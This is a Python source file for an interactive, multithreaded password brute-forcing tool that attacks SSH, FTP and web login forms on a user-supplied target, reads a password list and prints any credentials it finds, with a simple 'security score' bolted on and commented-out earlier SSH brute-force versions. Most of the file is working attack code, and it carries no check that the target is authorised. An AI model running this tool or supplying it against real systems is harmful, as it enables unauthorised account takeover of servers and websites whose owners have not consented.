#from sre_parse import State
import paramiko, sys, os, socket
import threading, time
from pyparsing import Word
from rich.console import Console
from art import *
import requests
import ftplib
from threading import Thread
import queue
import pandas as pd


###TASKS###
#Export results
console=Console()
stop_flag=0

'''
Brute_force class is related to make a 3 types of brute force: SSH, HTTP and ftp.
We got a password list and we try all of them on our target with user we set up before.
The main focus of the function is to get escalation to credentials by testing a lot of 
common password options.
'''

class brute_force:

    def __init__(bf):
        '''
        Initialize the needed variables
        bf.target - represent our target
        bf.username - represent the username that we want to try on him the password list
        bf.stop_flag - flag when we stop - means we found the password.
        bf.passwords_bulk - the path to our password bulk
        bf.single_password - test on manual single password
        bf.code - Which bruteforce we want to perform
        '''
        bf.q = queue.Queue() # Queue for threads
        bf.port = 21 # default for ftp connect
        bf.n_threads = 30 # default threads number
        bf.target = ""
        bf.username= ""
        bf.stop_flag = 0
        bf.passwords_bulk = "./Brute Force/passwords.txt"
        bf.single_password = ""
        bf.working_password = ""
        bf.code = 0
        bf.state = ""
        bf.boolean_checker = ""

        bf.credentials = []
        bf.counter = 0
        bf.connection_flag = 0
        bf.credentials_flag = 0
        bf.report_message = []

        #Scoring tests variables

        #Testing if the connection protocol is open to the world.
        bf.ssh_is_connected = 0
        bf.ftp_is_connected = 0
        bf.http_is_connected = 0
        #Checking if the session can run for long period without timeout.
        bf.ssh_check_persistance = 0
        bf.ftp_check_persistance = 0
        bf.http_check_persistance = 0
        #Check if the connection is succeded
        bf.ssh_found_credentials = 0
        bf.ftp_found_credentials = 0 
        bf.http_found_credentials = 0
        #final scoring
        bf.final_score = 0


    # Static method to show the menu of the feature
    @staticmethod
    def entry_message():
        '''
        Entry message with logo and menu
        The user will choose the current option that he want
        to perform his brute force
        In addition he can also import passwords list by himself
        or check for information by pressing H
        We MAKE PRETTY LOGO ASWELL
        '''
        art_font = text2art("Brute Force",font='cybermedium',chr_ignore=True)
        console.print(f"[bold red]{art_font}[/bold red]")
        console.print("#" * 55, style="bold green")
        console.print("#"*12,"Brute Force", "#"*12,style="dim cyan")
        console.print("#"*11,"Chooce who you want to attack", "#"*11,style="dim cyan")
        console.print("#"*11,"FTP / SSH / WEB", "#"*11,style="dim cyan")
        console.print("")
        console.print("#" * 55, style="bold green")
        print()
        console.print("[+]For help press - H")
        console.print("[+]To import your passwords list - i / I")
        console.print("[+]For SSH Brute force - 1")
        console.print("[+]For Web brute force - 2")
        console.print("[+]For FTP Brute force - 3")

    #Read help for the user from our txt document
    def read_help(bf):
        with open('./Brute Force/help.txt', encoding='utf8') as f:
            for line in f:
                print(line.strip())

    #try ssh connection, every time for every thread
    def ssh_connect(bf):
        '''
        This function is responsible for the connection try for the ssh funcition
        we use paramiko for ssh request by forward parameters to the target.
        In case of correct connection (good password), we will recive a message 
        with the username and the password
        '''
        ssh = paramiko.SSHClient() # create the connection
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) #configure policy
        try: # try to connect to the target through port 22 with username and pw through our password bulk
            ssh.connect(bf.target,port=22, username=bf.username, password=bf.single_password)
            bf.connection_flag = 1 # scoring test
            stop_flag = 1
            console.print('[+] Found password: @@@@@@@@@@@@@@@@@@@@' + bf.single_password + ' , for account: ' + bf.username)
            bf.working_password = bf.single_password #credentials test
            bf.credentials.append(bf.username) 
            bf.credentials.append(bf.working_password)
            bf.credentials.append(bf.target)
            bf.credentials_flag =1
        except: # If the password not correct we move forward to the next one and close connection
            console.print( '[-] Incorrect login, the password doesn\'t match: ' + bf.single_password)
            bf.connection_flag = 1
        ssh.close()

    #the threaded funciton that sent everytime password to the ssh_connect function
    def ssh_thread(bf):
        '''
        This function is responsible to mulithread the connection tries
        It is important because we got a huge list of passwords and if only 1 process
        will work everytime it will take ever.
        Therefore this function is responsible for reading passwords from file
        create multiple threads and send the username and the password to the function of
        SSH_connect, therefore we are split our passwords bulk and every thread
        doing amount of tasks.
        '''
        if os.path.exists(bf.passwords_bulk) == False:
            console.print('[!] That dictionary/path doesnt exist')
            sys.exit(1)
        print('Starting threaded SSH bruteforce on' + bf.target + ' with account: ' + bf.username + '\n')
        with open(bf.passwords_bulk, 'r') as file:
            for line in file.readlines():
                if bf.stop_flag == 1:
                    t.join()
                    exit()
                bf.single_password = line.strip()
                bf.counter = bf.counter + 1
                #print("pw is + ",bf.single_password)
                t=threading.Thread(target=bf.ssh_connect(), args=(bf.single_password,)) # objeto thread
                t.start()
                #print("thread = ", t)
                time.sleep(0.5)
             
    #posting - http brute force function
    def post(bf):
        #print("Please enter target")
        console.print("Your target is: ",bf.target,style = "dim cyan")
        #bf.target = input()
        data_dict ={"username" : "admin", "password":"password"}
        with open(bf.passwords_bulk, 'r') as file:
            for line in file.readlines():
                bf.counter = bf.counter + 1
                bf.single_password = line.strip()
                data_to_send = {"username" : "admin" , "password" : bf.single_password}
                response = requests.post(bf.target,data=data_to_send)
                bf.connection_flag = 1
               #print(response.content)
                if "Login failed" not in str(response.content):
                    print("[+] Password found --->" + bf.single_password)
                    bf.working_password = bf.single_password
                    bf.credentials.append("admin")
                    bf.credentials.append(bf.working_password)
                    bf.credentials.append(bf.target)
                    bf.credentials_flag = 1

    def connect_ftp(bf):
        while True:
            # get the password from the queue
            password = bf.q.get()
            # initialize the FTP server object
            server = ftplib.FTP()
            print("[!] Trying", password)
            try:
                # tries to connect to FTP server with a timeout of 5
                server.connect(bf.target, bf.port, timeout=5)
                # login using the credentials (user & password)
                server.login(bf.username, password)
                bf.counter = bf.counter + 1
                bf.connection_flag = 1
            except ftplib.error_perm:
                # login failed, wrong credentials
                pass
            else:
                # correct credentials
                print(f"[+] Found credentials: ")
                print(f"\tHost: {bf.target}")
                print(f"\tUser: {bf.username}")
                print(f"\tPassword: {password}")
                bf.working_password = password
                bf.credentials.append(bf.username)
                bf.credentials.append(bf.working_password)
                bf.credentials.append(bf.target)
                bf.credentials_flag = 1
                # we found the password, let's clear the queue
                with bf.q.mutex:
                    bf.q.queue.clear()
                    bf.q.all_tasks_done.notify_all()
                    bf.q.unfinished_tasks = 0
            finally:
                # notify the queue that the task is completed for this password
                bf.q.task_done()

    def thread_ftp(bf):
        passwords = open("Brute Force\passwords.txt").read().split("\n")
        print("[+] Passwords to try:", len(passwords))
        # put all passwords to the queue
        for password in passwords:
            bf.q.put(password)
        # create `n_threads` that runs that function
        for t in range(bf.n_threads):
            thread = Thread(target=bf.connect_ftp)
            # will end when the main thread end
            thread.daemon = True
            thread.start()
        # wait for the queue to be empty
        bf.q.join()



    #Scoring tests
    def scoring_test_connection(bf):
        if bf.connection_flag == 1 and bf.state == '1':
            bf.ssh_is_connected = 1
        elif bf.connection_flag == 1 and bf.state == '2':
            bf.ftp_is_connected = 1
        elif bf.connection_flag == 1 and bf.state == '3':
            bf.http_is_connected = 1

    def persistance_test_connection(bf):
        #print(bf.counter)
        if bf.counter >= len(bf.passwords_bulk)/3 and bf.state == '1':
            bf.ssh_check_persistance = 1
        elif bf.counter >= len(bf.passwords_bulk)/3 and bf.state == '2':
            bf.ftp_check_persistance = 1
        elif bf.counter >= len(bf.passwords_bulk)/3 and bf.state == '3':
            bf.http_check_persistance = 1
    
    def check_found_credentials(bf):
        if bf.credentials_flag == 1 and bf.state == '1':
            bf.ssh_found_credentials = 1
        elif bf.credentials_flag == 1 and bf.state == '2':
            bf.ftp_found_credentials = 1
        elif bf.credentials_flag == 1 and bf.state == '3':
            bf.http_found_credentials = 1
    
    def security_score(bf):
        if bf.ssh_is_connected == 1:
            bf.report_message.append("SSH connection succeded")
            bf.final_score = bf.final_score + 2
        elif bf.ftp_is_connected == 1:
            bf.report_message.append("FTP connection succeded")
            bf.final_score = bf.final_score + 2
        elif bf.http_is_connected == 1:
            bf.report_message.append("HTTP connection succeded")
            bf.final_score = bf.final_score + 2
        
        if bf.ssh_check_persistance == 1:
            bf.report_message.append("SSH connection is persistant")
            bf.final_score = bf.final_score + 3
        elif bf.ftp_check_persistance == 1:
            bf.report_message.append("FTP connection is persistant")
            bf.final_score = bf.final_score + 3
        elif bf.http_check_persistance == 1:
            bf.report_message.append("HTTP connection is persistant")
        
        if bf.ssh_found_credentials == 1:
            bf.report_message.append("SSH credentials found")
            bf.final_score = bf.final_score + 8
        elif bf.ftp_found_credentials == 1:
            bf.report_message.append("FTP credintials found")
            bf.final_score = bf.final_score + 8
        elif bf.http_found_credentials == 1:
            bf.report_message.append("HTTP credentials found")
            bf.final_score = bf.final_score + 8




    def init_main(bf):
        '''
        Here we init the function to run, we run the functions in order to the request of the user
        '''
        bf.entry_message()
        #bf.post()
        console.print("Please enter your wanted option from the menu:")
        bf.state = input()

        if(bf.state == 'h' or bf.state =='H'):
            bf.read_help()
            console.print("Press 'b' to back to the menu")
            bf.state = input()
            if(bf.state == 'b' or bf.state == 'B'):
                bf.init_main()
        elif(bf.state == '1'):
            console.print("You chose SSH Brute Force")
            console.print("Please enter your target(include 'http://') : ")
            bf.target = input()
            console.print("Please enter username to check with(recommendated - 'admin') :")
            bf.username = input()
            bf.ssh_thread()
            bf.scoring_test_connection()
            bf.persistance_test_connection()
            bf.check_found_credentials()
            bf.security_score()
            print(bf.ssh_is_connected)
            print(bf.ssh_check_persistance)
            print(bf.ssh_found_credentials)
            print(bf.final_score)
        elif(bf.state == '2'):
            console.print("You chose HTTP Brute Force")
            console.print("Please enter your target (include 'http://' and login page) : ")
            bf.target = input()
            console.print("Please enter username to check with(reccomendated - 'admin') :")
            bf.username = input()
            bf.post()
        elif(bf.state == 'i' or bf.state == 'I'):
            console.print("Please enter full *path* of the passwords text:")
            bf.passwords_bulk = input()
            console.print("Press 'b' to back to the menu")
            bf.state = input()
            if(bf.state == 'b' or bf.state == 'B'):
                bf.init_main()
        elif(bf.state =='3'):
            console.print("You chose FTP Brute Force")
            console.print("Please enter your target (include 'http://' and login page) : ")
            bf.target = input()
            console.print("Please enter username to check with(reccomendated - 'admin') :")
            bf.username = input()
            bf.thread_ftp()
            



        #bf.read_help()
        #bf.username = "admin"
        #bf.target = "http://www.ynet.co.il"
        #bf.ssh_thread()

if __name__ == "__main__":
    network_scan = brute_force()
    network_scan.init_main()





# def ssh_connect(password, code=0):
#     global stop_flag
#     ssh = paramiko.SSHClient()
#     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
#     try:
#         ssh.connect(host,port=22, username=username, password=password)
#         stop_flag = 1
#         console.print('[+] Found password: @@@@@@@@@@@@@@@@@@@@' + password + ' , for account: ' + username)
#     except:
#         console.print( '[-] Incorrect login, the password doesn\'t match: ' + password)
#     ssh.close()


    


# host = input('[*] Target address: ')
# username = input('[*] SSH Username: ')
# input_file = input('[*] Passwords dictionary: ')
# print('\n')

# if os.path.exists(input_file) == False:
#     console.print('[!] That dictionary/path doesnt exist')
#     sys.exit(1)

# print('Starting threaded SSH bruteforce on' + host + ' with account: ' + username + '\n')

# with open(input_file, 'r') as file:
#     for line in file.readlines():
#         if stop_flag == 1:
#             t.join()
#             exit()
#         password = line.strip()
#         t=threading.Thread(target=ssh_connect, args=(password,)) # objeto thread
#         t.start()
#         time.sleep(0.5)


##test##################################
#import paramiko, sys , os , socket 
# import threading, time



# this is bruteforce working without threads atm,
# need to be checked on many machines 

# stop_flag = 0

# def ssh_connect(password, code=0):
#     ssh = paramiko.SSHClient() #init
#     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy) #init

#     try:
#         ssh.connect(host, port=22, username=username, password=password)
#     except paramiko.AuthenticationException: #wrong password
#         code = 1
#     except socket.error as e: # any other error
#         code = 2
#     ssh.close()
#     return code


# host = input('[+] Target Address: ')
# username = input('[+] SSH Username: ')
# input_file = input('[+] Passwords File: ')

# #check if file exsist
# if os.path.exists(input_file) == False:
#     print('[---]That File/Path Doest Exsist[---]')
#     sys.exit(1)

# with open(input_file, 'r') as file:
#     for line in file.readlines():
#         password = line.strip()
#         try:
#             response = ssh_connect(password)
#             if response == 0: # password found
#                 print((('[+] Found Password: ' + password + ' For Account: '+ username), 'green'))
#                 break
#             elif response == 1:
#                 print('[-] Incorrect Login: '+ password)
#         except Exception as e:
#             print(e)
#             pass


#test##################

# import random
# import pyautogui

# chars = "abcdefghijklmnopqrstuvwxyz0123456789"
# char_list = list(chars)

# pw = pyautogui.password("Enter a password:")
# guess =""

# while(guess != pw):
#     guess = random.choices(char_list, k =len(pw))
#     print("<======"+str(guess)+"======>")

#     if(guess == list(pw)):
#         print("your password is : "+ "".join(guess))
#         break
